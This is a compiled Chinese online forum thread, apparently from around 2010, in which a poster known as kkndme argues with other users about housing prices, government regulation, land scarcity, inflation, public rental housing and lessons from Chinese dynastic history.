公租房是为体制内服务的 房产税一定会转嫁给租房人 巨大的税收消耗也决定了GDP必须快速增长 调控的好处是让zf利益最大化&防范金融风险 垄断可以控制价格，维持稳定 体制内的住房问题有国家保驾护航 依靠但又不能完全依靠开发商建公租房 体制内的住房问题不难解决 解决体制外的住房问题：国家垄断，细水长流收租 普通人买得起「优质商品房」就尽早买把 商品房和公租房的区别 提议通过征普税调节贫富差距，不是傻，就是坏（制定政策的人不会让政策针对自己，那么政策都是谁制定的呢） 调控带来的影响 农产品的价格关系到影响稳定的吃饭问题 农产品价格的抬头会导致物价全面上涨，但国家不会坐视不管且有能力管 资金会在优质资产之间流动，而决定优质资产价格的是精英阶层的购买力 资金流向规律决定了农产品和资产价格总有一个要涨，人为压制，一定会按下葫芦浮起瓢 资金流向规律决定了洼地不会一直是洼地 大城市对近距离的小城市有虹吸效应 决定房价的因素有很多，具体情况具体分析 房价暴涨是相对于钱而言的，不是相对于实际购买力而言的 土地不稀缺，优质土地稀缺 集中发展大城市是导致优质土地稀缺的原因 为人民服务是说给人民听的 历史是一面镜子，不同的国情决定了采取同样的政策结果可能是南辕北辙 zf限制政策房的利润，那kfs就一定会偷工减料 屁股决定脑袋，人民不知厉害关系选房子，zf选农产品 各个阶层的住房问题都安排的妥妥的 顶层的岁月静好来自于底层的负重前行 底层指的是体制外底薪白领 资金终会流向具有稀缺性的资产 土地的稀缺决定了大多数人永远买不起想买的房子 不同阶层的人对收入高低有不同的理解 一二线买房只会越来越难，最终租房会成为主流 人需要一个安身之所，能买早买比晚买好 股市 如果房价不涨，那其他产品会怎么涨 zf如何利用公租房控制租房市场 城中村不会长期存在 三四线城市的未来 房租价格涨不上去，本质是买房还看起来有希望 稀缺房的价格永远涨 粮食和房子的不同是，房子无法和土地剥离 购买房价基数低的省会城市，怎么都不会亏的 房地产是资本市场还是实体经济？ 什么是傻空 什么是真买不起房 具体情况具体分析，如果看不懂，一定是没有抓住问题本质 桂林 vs 南宁 公租房的量级不会冲击到商品房市场 贵阳，资源的稀缺导致权贵更容易垄断，通过低收入高物价的方式剥削底层群体 重庆：高层和别墅怎么选？ 货币贬值 为什么美国人工高于中国，但大多数商品的物价却低于中国 还能上车的赶紧上车 武汉：城市发展空间的大小，往往和房价的升值空间成正比 权利让革族成为苗族的一支 房价是否会跌，如果会，会怎么跌 通货膨胀是减缓灭亡最好的良药 货币供应不足是明朝的真正原因 经济问题是导致清朝灭亡 房产投资的几点建议 人民币对外升值，对内贬值 南宁买房建议 经济适用房都是内部分配的 普通人怎么办：尽早买房，努力挣钱抵御通胀 房价会出现很多上下波动 买房时机的选择（真TM厉害，这竟然是2010年的建议，可恨的是2020年才看到） 收入分配改革跟体制外的人没关系 体制外的人要早早考虑养老问题 永远不要和白痴争辩，因为他会把你的智商拉到和他同一水平，然后用丰富的经验打败你 当个农民也要懂政策，要顺政策而为 存钱不如存资产，钱会贬值，资产会升值 房子越早买越好，zf想钱想疯了 利益才是zf行为的指挥棒 建议一定是建立在严肃考察的基础上 石家庄 投资最重要的是稀缺性，买房首选公务员小区 远离垃圾人 高房价或许有天会崩盘，但你等不到那一天 房子不仅要早买，而且有能力的话不要怕压力，争取一步到位 金融杠杆是炒房赚钱的放大器 要用发展的眼光看问题，只要努力，只会越来越好，越来越轻松 性格决定命运 2012年不取消调控，还有房价维稳顺利换届考虑 洼地最终都会被填平，多数城市是早买胜于晚买 西部 短期波动属于正常现象，需要关注的是长期趋势 领导人的智慧和才干决定了国家的命运，统帅的智慧和才干决定了军队的命运，而个人的智慧和才干决定了个人的命运 对于具备投资属性的商品，供求关系是指货币与商品之间的关系 早买的风险小于晚买 小开发商的房子能不能买？ 大兴土木搞建设的城市，房价都底不了 北京老式砖混板楼的最终命运？ 把房买在zf边，差不了 天子脚下：二手老房买得好，拆迁补偿少不了 3万入手北京四环，你也是幸运的 君为贵，商人、技工次之，农民为轻，打工人为底 10年的调控和08年调控的区别、带来的影响、机会 历史总是惊人的相似 关于房贷 买卖商品房会逐渐变成富人的游戏 zf还是更在意农民问题 治国需要用贪官、反贪官 二线城市典型代表 关于商铺和住宅投资 关于房产调控 关于房产税 老公房的拆迁问题 投资新房还是老公房 高端盘有房价带动作用 买房和没买房的差距 房产交易历史 契税的历史 廉租房的历史 历史上买房最好的朝代 未来房地产市场的发展 房产到期 买学区房问题 历史的结局 人口普查 昆山房价分析与买房 为什么现在租售比这么低 & 同小区买一套大还是两套小 买房难之回不去的乡 & 拉美人过得比你想象的好 租房的苦 北京西三旗 买房争取一步到位 收入稳定的家庭如何买房 北京回龙观 贷款还是全款 00后的买房需求从何而来 意大利的住房模式 中国的学术 北京远洋山水 精英的资产 北京三环塔楼 普通人买房的未来 北京房价超香港 中国的新闻不可信，精英的有钱是你想象不到的 40年的商住房没有70年的住宅有投资价值 限贷对精英没用 外汇管制决定了大部分有钱人只能在国内投资 外国国籍在中国生活是更好的选择 分期付款买房，如果房价上涨，很容易毁约 & 自住要选大品牌开发商 通货膨胀和房价的关系 南京买房分析 & 买房要做好调查分析工作 北京华清嘉园 中国的朝代更替 中国可以无限印钞吗 读史读的不是故事，还是找历史规律，以古鉴今 毛太阳往事 北京大兴 贵阳 富人越富、穷人越穷 通货膨胀的形成原因 深圳 & 昆明仇书记 & 通货膨胀体制内高枕无忧、体制外自求多福 长春 佛山 首付提高的逻辑 四线城市 苏州工业园 住房公积金利率 济南 & 大规律拆迁的城市房价不会下降 公务员小区牛逼 房屋朝向只要不是纯北西就行 & 买房首选市中心、公园地产 zf搬迁 俄罗斯 珠海 & 唯一自住房不只是投资 & 调控是最佳的选房时机 经济崩溃，最后接盘的是老百姓 命运之矛 除非外族入侵或全国大饥荒，否则双轨制决定了房价不会崩盘 kkndme聊北宋、唐朝 宋代房奴 ZG民主 王安石的青苗法之国家出政策的动机 什么是社会公平 还是有很多有钱人 双轨制之体制内的福利 开发商思维 农民政权的缺点 郑州有前景 公园地产是稀缺资源 张献忠屠川 洪秀全、黄巢、李自成 朱元璋 曹参治国 晁错 民营小企业的老板和打工者 郭解 2010年的中国房地产 房奴算不上不幸，相当当不了才算 精英人群的平均收入决定房价 内地不是香港、海南 历史是一面镜子 买房一次性到位比较好 外汇管制 一线和二线 吕后篡权 小产权房 商铺和住宅 体制内外 2010年的上海 买房：物业与房贷 收紧住房贷款 买房：物业与房贷 奸臣蔡京 体制内的28原则 贾谊 kkndme 推荐的历史书 年轻人要早买房 不要低估通货膨胀 二三线城市与重庆 城区和郊区 守着金碗要饭吃 人制的社会，人就是制度 准公务员的好处 小城市房价会因为人民币贬值涨价，但依然难变现 一线杭州 二三线城市的发展靠拆迁 转篇文章：一个忽悠了几亿中国人的伪概念：所谓\"中国房地产泡沫\" 拆迁补偿 城市底层 垄断企业 农村自来水 袁盎 二三线城市，选新城还是老城 在中国，普通人手上闲钱不多的人被剥削 三分天注定七分靠打拼 人的前程有的时候不掌握在自己手里 河南郑州与洛阳 杭州 西安与重庆 谢国中「空置率」 打工不如有一技之长的小老板 一线、二线的生活 讲故事含沙射影ZG之房子不属于市场经济 什么是好的政策 李商隐「渣男」祖师爷 西五环内的别墅，是相当稀缺的资源 调控降房价是刚需的一厢情愿 2010年的房地产调控，让很多人看到了希望：让房价降得再猛烈些吧。还有人更是幸灾乐祸似的呼喊：让房地产赶紧崩盘吧。让没房子的好好看看有房子的笑话，是人生的一大快事。 但是我们是不是要仔细想想，为什么调控？调控期望得到什么样的效果？ 是如千千万万想买房子的人期望的那样，让人人买的起房吗？ 是如千千万万的流氓无产者期望的那样，让房地产崩盘，开发商上吊，dfzf不再靠卖地实现gdp吗？ 2010年房价下跌已经变成了人民最急切的期望，已经高过了解决超贫困家庭的温饱问题，已经超过了子女教育，医疗和养老。并且为房地产必须下降提出了若干义正言辞理由，总结下来无外乎三条： 人人都有居住权。房子是用来住的，不是用来炒的。 房子太贵了，租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘。 房价上涨造成物价上涨，人民生活变得困难。 的确，当经济过热，房价过高，会对经济运行和社会安定带来较高的风险。这也是国家所担忧的。防范金融风险，一切维稳才是zy考虑的重中之中。 而民间所总结的三条，应该和调控的原因和目的基本不沾边。让我们一条一条的分析一下： 1、人人都有居住权。房子是用来住的，不是用来炒的 其实这是一个伪命题。房子包括房屋及房屋所属的土地两个部分。房屋本身只有居住价值；而土地所具备稀缺性，决定了土地的投资价值。房地产贵的不是房屋，而是房屋下面那块地皮。所以商品房具备了投资与自住双重属性。 任志强说的并没有错，居者有其屋并不等于人人享有商品房的产权。居住的房屋也不等于商品房。 liougehooa： \"任志强说的并没有错，居者有其屋并不等于人人享有商品房的产权。居住的房屋也不等于商品房。\" 任志强这句话绝对没说炒房价，房子在他眼里还是住的。 难道你用byt是你老er比较稀缺才买？那也没看见byt暴涨到5W一个。 \"而土地所具备稀缺性？\"任志强也说了，拿出全国耕地的1%也够老百姓住了！现在是啥科技了，舍掉1%耕地对农作物有什么影响？ kkndme： 华北平原从河北到山东有大片的盐碱地，你都可以用于盖房，而且会非常便宜，也没有人跟你竞价。但是你在那里盖了房子并不能保证你天天按时在北京城区上班。 2、房子太贵了，租售比严重不合理，空置率太高，人均收入太低，早晚要崩盘 这个问题比较大。房价是不是太贵了？有没有泡沫？ 我们首先从国民的收入结构来分析 一个遵从\"丛林法则\"的精英社会决定了国民收入的金字塔结构。 既然是金字塔，底端的中低收入者占据了金子塔的最大比例，但是大家要知道金字塔的顶端既使只有10%人口，那也将是一个1亿多的绝对庞大的数字，远远超过了绝大多数西方国家的人口总和。 而北上广深以及三十多个省会，这些个靠掠夺全国或者一省资源，以牺牲大多数人口的利益为代价发展壮大起来的超大型及大型城市，需要容纳全国1亿多的精英人群，是否能得出房地产严重泡沫，空置率过高的结论？ 当低收入者们努力挥洒汗水期望着自己年薪能够超过5万，8万，10万。。。的时候，他们可能做梦也想不出精英阶层手中究竟拥有多少财富。 精英们会象流氓无产者们一厢情愿认为的那样：因为一个区区房产税而恐慌性抛弃手中的大量房产吗？ liougehooa： \"因为一个区区房产税而恐慌性抛弃手中的大量房产吗？\" 现在不说哪个富豪不是靠偷税漏税爆发的，我就举个例子，一套房不收税，二套房也不收税，三套房收300%税，你龟儿子还敢买三套房？ kkndme： 你说的事情在历史上已有发生，大明律明令禁止超标准建房，如果违禁，不仅仅是收税的问题，而是打板子下大狱，没收充公的，比房产税可要狠多了。但是终究没能执行下去，原因在于官员太腐败，不符合官员地主阶层的利益，最后名存实亡了。光是梗着脖子叫唤是没有用的，利益驱动着社会的发展，违背统治阶层利益的事情即使出台也难以执行，最后的下场都是不了了之。 答案显然是否定的。 可以确认的是，房价不是由统计局的平均收入决定的。而是精英的平均收入决定的。 为了便于分析，我们剥离掉商品房（注意：只是商品房，而不是房屋）的社会属性，先把它看做商品。是商品就有他的内在规律。 什么决定商品的价格，价值？对不起，我只能说你上学上傻了。 是供求关系，只有供求关系。 我们判断一个核心城市市区内的商品房是具备足够稀缺性的。 如果你在北京海淀区上班，即使你在山海关拥有1000平方米的住宅也不能替代你住在北京市近郊区以内的愿望。而无论你是租房，分房还是买房，只要你还在海淀区上班，你就必须住在北京市近郊区以内。 假设你挣得钱不足够多，你需要租一套房子解决你的上班问题，上班距离的远近及居住的质量，取决于你愿意支付的租金。 假设你的钱够买房子，我相信你更愿意买房，因为你可以拥有房屋的产权和房产增值的收益。而买房子的大小，品质，离你上班的远近，取决于你手中的资金和你对未来收入的预期。 买房问题很象是中国的上学问题，而且简直是异曲同工。 假设你家附近有个重点中学，教学质量很好，考大学几率很高，而其他的学校你觉得不理想，你肯定希望无论如何自家小孩也要上这个重点中学。 上重点中学凭什么？我们简单的剥离掉其他社会因素的影响，可以认为想上重点中学就要凭好成绩，小孩努力考到前多少名，就可以上重点中学。这与努力赚钱买房是一个道理，有钱的出高价就能买到好位置好环境的房子。 我们再加入社会因素的影响，比如某大人物看到这个中学很抢手，很可以赚一笔，于是就设计了加分项，谁给自己送的钱多，就给谁加分，于是小孩要上重点中学不但要考高分，还要送钱加分。 同理，当好位置的商品房成为稀缺资源，各类炒房客的出现是必然的。 如果说炒房客加高价给最终住户的行为会产生泡沫，那么重点小学和公立幼儿园高昂的择校费应不应该也叫做泡沫？ liougehooa： \"如果说炒房客加高价给最终住户的行为会产生泡沫，那么重点小学和公立幼儿园高昂的择校费应不应该也叫做泡沫？\" 你拿一个错误的现象，说这个现象是正确的来证明你错误的房价观念是正确的，可笑！ kkndme： 事情不能简单用正确还是错误来评价，一件事物发生一定有发生的原因。你说皇帝统治老百姓，想杀谁杀谁是正确还是错误？如果是错的，但是却在中国延续了几千年。 尽管炒房和公立幼儿园加价成为普遍的社会现象是令人痛心的，但它们不以刚需人群的意志为转移的存在着，且与泡沫无关。 最被提及与泡沫有关的是以下两点： 第一，中国的房价甚至高于某些发达国家的房价。 其实，众所周知的是：不光房价高于某些发达国家，石油，高速，教育，医疗，税收等费用都远远高于某些发达国家。 而且中国的精英人群尽管所占比例不大，但是绝对数量足够大，而且精英平均收入甚至远远高于某些发达国家的收入水平。 第二：租售比问题 这个问题不用过多解释，使租售比更合理的方法不是只有降低房价一种，还有一种更靠谱的：房租大幅度上涨。而且已经在行动中。房租长期保持低价就像1990年以前的和田玉长期保持低价一样不可能。 3、房价上涨造成物价上涨，人民生活变得困难 这个问题其实也不用多解释，懂经济学的该明白自然会明白，不会轻易被忽悠，不懂的解释半天也不会明白。 简单的可以这样说，物价上涨是经济过热，钞票印多了的后果。而房地产因为稀缺性和易保存比较吸金，所以吸收了大量的钞票，以至于大家光看到了房地产的飞涨。 liougehooa： \"而房地产因为稀缺性和易保存比较吸金，所以吸收了大量的钞票，以至于大家光看到了房地产的飞涨。\" 房价高涨，你要发的钞票必须要多，不然怎么去买房子？你发的钞票越多，钞票不是你发下来去买房子就死掉了不流通了，它只要流到人的口袋或者银行的口袋，这钱立马回出现流动，能不造成通货膨胀吗？除非这笔钱收到后限制房东使用。 为了支持高房价，国家必须发大量货币，这也是去年房价高涨的原因。 kkndme： 请先了解一下中国的货币发行制度，人可以无知，但不可以乱说。让人笑话。 其实如果房地产交易量下降，不再具有吸金功能，那么农产品等生活必须品以及房屋租金等等就会大幅上涨。这是因为多出来的大量钞票总要有个流向，如果不被房地产吸收，就会被大蒜，绿豆，姜，及全部生活必须品的上涨来吸收 事实也证明确实如此。2010年房产调控后，物价上涨的势头非常迅猛。 调控的真正目的：防范金融风险 & 通过垄断实现gj利益最大化 那麽是不是房地产就没有泡沫呢？ 这个问题谁也不知道，因为到现在zf拿不出一份权威的数据来说明房地产到底有无泡沫。 但是房价高了就有风险，zf从感性上还是有清楚认识的。 注意，我们前面啰嗦了很多，现在才开始接近这次调控的真实意图。 防范金融风险？不错，你说的很对，但是没这么简单。 辨别利益是看透一切事物真相的武器。 高房价谁是受益者？ 房地产游戏的模式三个环节：dfzf卖地、银行贷款、开发商在二级市场销售 dfzf卖地之后，剩余的风险和收益都归银行和开发商 dfzf卖地的款则用于地方广场，地铁，公路之类的建设和权贵的挥霍。 dfzf只负责卖地，是无风险的买卖。 只要房价不断上涨，加杠杆的炒房客就会赚到盆满钵满 这么分析下来，最受益的地方政府、开发商、炒房客。 独独缺了zy。 这时你是否猜到zy为什么要调控？如果还猜不到没关系，听我道来。 纵观古今，上位者最不能容忍的是别人受益，自己被黑锅。 大kfs，小kfs，大炒房客，小炒房客，dfzf都是收益者，但是风险却由zy来抗。这是一笔很不划算的买卖。 而房地产混战的局面，造成了国家队央企成员只有凭财大气粗高价拿地的份，钱花的最多，风险却抗的最大。 zy深深的感觉到要想国家队受益，要想控制风险只有做到两个字：垄断。 提高资金门槛，让小kfs，小炒房客，有点钱的小老百姓推出这个游戏。房地产很好玩，但不是小人物应该玩的。 先让市场冷静，彻底整顿，踢出那些个跳梁小丑，然后国家队出马，绝对垄断的市场，才能够统一定价，才能够控制风险，才能够利润最大化。 既然油价高于美国是合理的，那麽房价高于美国一定也是合理的，关键在于垄断。 不仅仅是房价的垄断，因为过高的垄断定价将会使交易量下降，国家队也需要资金周转。 真正厉害的，还是房租的垄断。公租房的推出是房租垄断进程的里程碑。 至于苦等廉租房的同志，不要抱太大的希望。城市要建设，地铁，广场，政府大楼都要上马，钱从哪里来？不会无缘无故凭空出来。 想想小学就近上学，但是重点小学真的就近就能上吗？小学名额可以寻租，经适房，廉租房也是一个道理。 tjOOSAN： 真扯啊~~~ 油价跟房价去比？？ 这位kkndme ，你就别忽悠了！~~ 汽车对于百姓而言，可有可无，油价涨到是美国的一百倍，中国百姓才高兴了。 大哥！房子是必须品。ok？那么既然你也认为政府的钱大多从地产来。 那么这种发展正常嘛？会持续吗？？没有实体经济，能行吗？ 招你的法子说，炒楼才是中国的前途？ kkndme： 这位兄弟，您比那些希望钱钱去炒大米的还不靠谱。 石油影响的不仅仅是开车的人花费多了。疯狂上涨的运输成本会导致民不聊生的。 假设一斤蔬菜从广西的农民地里收购是0.5元一斤，但是由于油价的像你说的上百倍的涨，运到北京，这斤蔬菜要卖300块一斤。 社会就瘫痪了 tjOOSAN： 那么这种发展正常嘛？会持续吗？？没有实体经济，能行吗？ kkndme： 实体经济的发展不是简单的钱不去投资房产，就会去投资实体经济，实体经济就发展起来了。估计媒体洗脑洗的比较厉害，你中毒了。 资本是趋利的。无论是哪个国家，哪个社会，只要存在市场经济，这个道理就一定不会错。 为什么资金进入房地产及其他资本市场而逃离实体经济？是因为实体经济环境不好，不赚钱。 一是税赋太高，二是各种需要打点孝敬的部门、管理人员、工作人员太多，比税赋还高，不能承受之重。三是国家队在各个重要领域的垄断，使国企变成了变相税务局的职能，垄断企业的暴利定价，又是压在本应该蓬勃发展的实体经济上的又一座大山。 现在央企基本是不垄断的行业不做，把产能过剩，充分竞争的产业交给民间资本，并且还要给这些资本压上高昂的负担. 有可能垄断的行业包括房地产都会收到国家队手里，以后更是将发展成为一个高度垄断的社会。 资本不是傻子，一定会趋利，所以资本放弃了操心受累不挣钱的实体经济，转而投向房地产。房地产的调控，让资本又进入了黄金、农产品领域参与爆炒，反正就是不进实体经济。因为国家不给实体经济的环境做任何的改善。 如果实体经济有一个好的环境，有一个好的获利空间，大量的资金就不会撤出实体经济，没有资金潮涌般的投入房地产市场，中国的房地产将会是一个平稳的上涨趋势。 但是体制决定了资金的去向，不以人的意志为转移。 高税赋、暗箱成本及垄断不但造成巨大的贫富差距，而且将会导致生活成本的大幅提高，生活负担日益沉重。 一方面百姓生活负担的加重，导致一些非生活必须品严重产能过剩，将会出现大量亏损倒闭的内需企业。 另一方面精英阶层快速聚集大量财富，使奢侈品供不应求。古董，字画，玉器，豪车，顶级服装的消费比重也将越来越大。 但是能够容纳大量资金的只有两个领域：农产品领域（满足老百姓的肚子）和商品房领域（居住权要满足老百姓的需求，产权要满足精英阶层的需求）。 资金的流向只能疏导不能强堵，zf很明白这个道理。两者危害取其轻，你认为zf会选择哪个领域？ tjOOSAN： 真扯啊~~~ 油价跟房价去比？？ 这位kkndme ，你就别忽悠了！~~ 汽车对于百姓而言，可有可无，油价涨到是美国的一百倍，中国百姓才高兴了。 vavan2010： 这种人肯定最后就是蠢死的。你没车，不用汽油，你可知道生活中有多少东西是需要用汽油的？无知才最可悲！ kkndme： 我们为确实买不起房的低收入群体，只能感到无奈 但有些本来能买房却嫌这嫌那而不买房的傻空通知，我们只能说你买不起房，完全是自己的原因，连油价上涨意味着什么都搞不懂，贫穷真的不能怨别人。 官方公布的统计数据，只要关系到某个群体的利益，就一定会被修饰导致失真 说到房产泡沫的问题，就不得说说官方的统计数据。 官方的统计数据从来是可以很雷，但不可以很真。 我们的统计原则基本就是：村骗乡，乡骗县，一骗骗到国务院。 不知道有人去市、县、乡、村进行过社会调查没有？ 社会调查是怎么一回事？ 我来告诉你，所有的关于人口、收入、田地、贫困户的数据都是官方统一编写，统一口径，如果胆敢有哪个小民对调查人员乱说，那是吃不了兜着走的。 你问了数据编来编去的意义在哪里呢？ 意义很大，起码跟向上申请拨款是关系非常密切的。数据不假，钱从哪来？ 统计数据无所谓是否真实并不重要，重要的是它是获取利益的重要手段。 假设官方想证明房地产不存在泡沫，那么一定拿的出不存在泡沫的统计数据作证。 反之，也一样。 好比,CCAV为了证明高空置率的结论，派出记者专门找偏远且刚刚完工的楼盘，进行了一次纯粹为了证明内部已事先得出结论的毫无科学依据的调研。 而dfzf，为了证明刚需多么强劲，也立刻拿出了选择性失明的统计数据来进行回击。 无论是左还是右，同样都是不科学，都是现有结论，再有证据。 我们到底应该信谁 cdw1： 商品房本来名字中就有商品二字不准投资岂不是笑话？真正不准投资的那叫公房，这才是保证老百姓有房住的关键，商品房诞生的时候就很明确是改善居民居住条件的，现在政府怪商品房价格过高造成老百姓没房住本来就是颠倒黑白，政府不造保障老百姓居住的公房，而让老百姓去购买改善居住条件的商品房来解决本该政府解决的居住问题，政府不作为才是造成老百姓出现居住问题的罪魁祸首。我不期望人人有房，我只希望每一个在城市里找到工作的人通过努力工作勤俭持家能在生活城市里有希望拥有一套安稳的房子来容身，不管这房子的性质是商品房、经适房、廉租房或者其他什么房子。 kkndme： 你说的正是根源所在啊，zf的职责应该向无房者提供的保障房，建成经适房、两限房，被权贵占有牟利，而非要把商品房赋予稳定社会的职能。zf不是不知道问题的根源，而是不愿意放弃巨大的利益。 税收从来都是向下游转嫁的 & 房产税迟迟不出台的真正原因 闲扯了一下统计数据 还是回到这次调控中来 房地产游戏的模式三个环节：dfzf卖地、银行贷款、开发商在二级市场销售 dfzf卖地之后，剩余的风险和收益都归银行和开发商 dfzf卖地的款则用于地方广场，地铁，公路之类的建设和权贵的挥霍。 dfzf只负责卖地，是无风险的买卖。当然还有人企图利用流氓无产者和无知群众的群情激奋来进一步收取房产税来提高dfzf收入。 税收从来都是向下游转嫁的，zf多收出来的钱一定是通过最下游的房租来体现。 当然，也有很多明白人士大声疾呼反对房产税。 自古而今，即使最辉煌的朝代，最被广大群众津津乐道的太平盛世，普通群众也仅仅只是解决了温饱而已，包括贞观、文景、康乾。 国家的富庶都是以老百姓勒紧裤腰带为代价的。 所以，zf是不会理会部分明白人反对房产税的呼声的。 真正对房产税的顾及来自于dfzf对土地出卖前途的担忧，真是鱼与熊掌不可兼得。 尽管流氓无产者和无知群众的呼声很高，然而房产税征收一旦实际操作起来，就会变的不得人心，征收难度非常之大，实际效果难以预知。也就是说zf没有底。而如果房产税征收效果不佳，dfzf卖地收入再受到巨大影响，那就真正是得不偿失了。 就会变成赔了夫人又折兵。 这样的买卖，zf是不会轻易做的 房地产的现状 房地产的现状是，商品房二级市场是由各种类型的开发商自由竞争的，一手房开发商之间的竞争，二手房投资客之间的的竞争。 房价持续上涨的本质是稀缺性让好房子成为资金最好的去处 房价为什麽在一个自由竞争的市场上能够持续上涨？因为稀缺性。不是房屋的稀缺性，而是房屋所必须占用的土地的稀缺性。 有些群情激奋的群众立刻以6500万套房子空置的事情提出质疑，还有ccav的报道，那是要多煽情又多煽情。 我们无需说6500万套的真实性（明白人都知道非常离谱）和空置我心的科学性。为什么不说，因为这种稀缺性跟空置率就完全没有关系。商品房的稀缺性是相对人民币而言的。人民币印多了，资金没地方去，商品房就涨价了。 关于垄断 1、垄断的好处是没有风险 垄断的市场是没有风险的，土地是完全垄断的，所以dfzf完全没有风险。 而商品房是自由竞争的市场，是具备风险属性的，尽管由于大量印钞造成了商品房的飞涨，但随着房价的高涨，风险也在积聚。 dfzf土地垄断没有风险，完全可以置身事外。 可是银行呢？属于国家的银行。 银行正在承担自由竞争市场房价高涨积聚的风险。 这是zy不允许看到的，dfzf受益，而风险全部甩给zy。 既然垄断的市场是没有风险的，那还是让房屋和土地一起垄断好了。 2、垄断可以解决社会稳定 垄断还可以解决一个问题：社会稳定。 常被媒体和群情激奋群众所提及的一个重要问题就是：房价收入比。 大量印刷的人民币促成了房价高企（因为商品房实在是具备了大资金需要的所有投资品属性），可是那些个巨额的资金普通老百姓并没有见到。 路人甲：我们一个月就挣2000多块钱，干一辈子买不起房啊。 路人乙：我一个月上万都买不起房。 媒体：一个家庭不吃不喝22年买一套房 大量的疯狂印刷的人民币在哪里呢？ 在精英手里。 我们在回顾一下开篇，我们奉行的是精英社会，丛林法则，金字塔式收入结构。 人民币再多，也不可能流到金字塔的底端。 dfzf垄断卖地也就让百姓们发发牢骚。 而炒房客，kfs赚的盆满钵满就让生活在中下层的老百姓眼红和不能容忍。 不患寡而患不均啊。 垄断，国家队的垄断，可以解决眼红问题，也就是社会稳定问题。 3、房屋垄断只会愈演愈烈，底层人民想要拥有一套房子的难度只会越来越难 还有一个最重要的问题：银行和民营开发商之间，是官与民之间的问题。 而银行和国家队央企，是左兜和右兜的问题。 土地是垄断的 然而房屋垄断并不是一件容易的事情。 因为民间百姓手里是存在大量二手房的，当然这也是为什么调控的板子只打在二套房、投资客、炒房客身上的原因。 同样，房租的垄断也并不是一件容易的事情，因为民间百姓手中的大量二手房都具备出租的特性。 俗话说，问渠哪得清如许，唯有源头活水来。 要垄断，必须抓住源头。 源头在哪里？ 在一级市场，而不是二级市场。 房地产的垄断就是要国家队从一级市场做起，从一级市场开发着手完成对商品房开发的垄断。 一级市场，那是一个高高的门槛，民间资金，就让他该干嘛干嘛吧，房地产不是你玩的。 一级市场包括的内容是一般开发商无法参与的： 城市规划，城中村改造，旧房拆迁，城市综合体开发。 可以说从规划、改造拆迁、开发、到二级市场销售，一条龙服务。 一级市场开发的最大特点就是可以创造需求：你不是有房子吗？我拆掉你的房子，看你有没有刚需。 国家垄断控制风险的意义还在于：需求可以拆出来。 以后的路，民营开发商的日子将变得越发艰难。 土地是dfzf的，商品房开发是央企和国企的。 处于金字塔下层的40%家庭，如果还没有一套自己的房子，那么买一套自己的房子就越发的变得不可能。 商品房将逐渐往金字塔的上层积聚。 处于金字塔下层40%的无房家庭将只能以租房来解决居住问题。 租金的快速上涨期即将到来，zf已经盯上了房租这块巨大的蛋糕。因为房租的收益比房产税更靠谱，更具有操作性。 公租房，呼之欲出 民生问题 sunxinmfc： 政府无需考虑民生问题么，本次号称史上最严厉的打压政策再起不到一点效果，ZF威信力将进一步下降，需要仔细考量 kkndme： 自古以来，民生问题的底线就是不要出现陈胜吴广的极端情况。所以zf更在意的是农民问题。 因为历史的改朝换代都是大饥荒引起的，无论是汉末、唐末、隋末、还是明末。农产品价格上涨的对zf的震动要远远大于房价的上涨。 农民具备最原始的力量，而他们关心的并不是三线以上城市的房价，而是能否填饱肚子。 而关心自己能否拥有一套产权房的都市白领，除了呻吟一下意外，几乎是没有什么有效反抗的可能的。 sunxinmfc： 秀才造反，三年不成，自古已然。 但我们还没有谈到所谓\"造反\"的地步，只是说房价如你所述，暴涨，中国的中产和以上人士将进一步携款合法外流（在房价暴涨的09年，中国外流人口达到历史峰值）。这一部分人利益如何保证？您觉得zf不需要考虑对么？ kkndme： 现在社会跟几百年前最大的不同是，世界是开放的，这得益于地理大发现和世界经济一体化，即使缅甸朝鲜这样封闭的国家也免不了受到来自世界范围的影响。大一统的集权社会融入了西方民主的思想，同时互联网的出现也让人们对过去的思维进行了再思考。 尽管底层百姓出国还是一个梦想，但对于精英人群，基本上是在世界范围自由流动的。 中国自古以来，商人都是没有地位的，商人的财产可以随时被官员没收，自古如此，至今如此，即使是今天也并没有出现私人财产神圣不可侵犯的宣言。即使出现了，也没有任何可以操作的可能。 明朝以后大量的商人移居海外成了华侨，现今的商人为了安全移居海外也不是什么新鲜事，不过是步明朝华侨的后尘罢了，zf会真的放在心上吗？朱元璋没有放在心上，朱棣没有放在心上，现在同样也不会放在心上。 真正可怕的是官员一方面谋取私利一方面把亲属和存款送到国外，这其实是一种国家背叛。在国内榨干老百姓的血汗，得到的金钱却在国外挥霍。什么叫卖国，不过如此。 connstr： 假如商人可以移居海外，官员自然也可以。官商能分家吗？ kkndme： 商人还是要分的吧：红顶商人就是官商，统治阶级，那是上位者。 普通商人，比如开个袜子厂赚个辛苦钱，最后袜子厂不挣钱了，官员还天天找他，让他孝敬，他就只好移民了。 普通商人在中国也是海量的，有点钱，但是没一点地位。 中国自古以来都不是人人都能有属于自己的房子，大量的丫鬟、仆妇、管家、小厮寄养在权贵人家，身体都是不自由的，何谈拥有自己的房子。 自古以来，最多的就是失去土地的农民，住在地主家做长工，又何谈属于自己的房子。 只要是有贫富差距的社会，只要存在阶级，只要存在统治和被统治，这个社会就会不以人的意志为转移的出现大量的底层居民，没有这些底层居民。权贵就不能很好的生活。 为了权贵生活的更好，就要维持大量的底层群众。 权贵必须保证大量底层群众的基本生活，才能够让自己过得更舒服，仅此而已。这就是民生 sunxinmfc： 删掉了一大段，不得不说，你说的很对。 （呻吟一下）。君不见，天涯上多少盼着被美军解放的铁杆准汉奸，政府楼被炸七成网民不是替死者默哀，而是一片欢呼。为什么会有这样的民意，参考前苏联，ZF确实应三思 kkndme： 爱国是与中华的历史分不开的，自秦统一以来，中国由封建时代转变为帝国时代，只有在项羽焚烧咸阳后，对诸侯进行了一次分封，但时间非常短暂，刘邦重新统一了天下，帝国时代经历了漫长的汉、唐、宋、元、明、清。天下一统的爱国情结是根深蒂固的。 而在秦以前，与中世纪的欧洲是极为相似的，齐国人可以到秦国做宰相，赵国人可以到燕国做将军。中世纪法国的诺曼底公爵可以到英格兰继承王位，瑞典的贵族可以到基普做大公，封建时代的国家概念并不是明显。欧洲经历了漫长的封建时代，国家观念很淡薄，能够抛弃国家货币成立欧盟就是明证。这对于漫长帝国时代，天下一统的国家是很难想象的。 爱国只跟历史文化传统有关。 